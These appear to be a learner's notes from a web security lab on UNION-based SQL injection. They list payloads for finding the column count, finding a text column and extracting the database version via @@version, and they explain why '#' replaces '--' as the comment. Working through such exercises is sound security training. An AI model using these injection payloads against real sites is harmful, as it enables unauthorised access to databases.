1) we need to understand how much column has the current table we are querying so we have to use:
    category=Pets' union select null #

    but we obtain internal server error so we use ' union select null, null #
    ok

2) we need to understand if one of these two columns is text so we can do:
    ' union select "hello", null #
    ok

3) so now we can obtain the information we need
    ' union select @@version, null #



NOTE : comment -- doesn't work here so we need to use #
This beacuse the union can be done only on tables of the same number of columns and we can retrieve only the same type of data, so we need to search also the column that is text
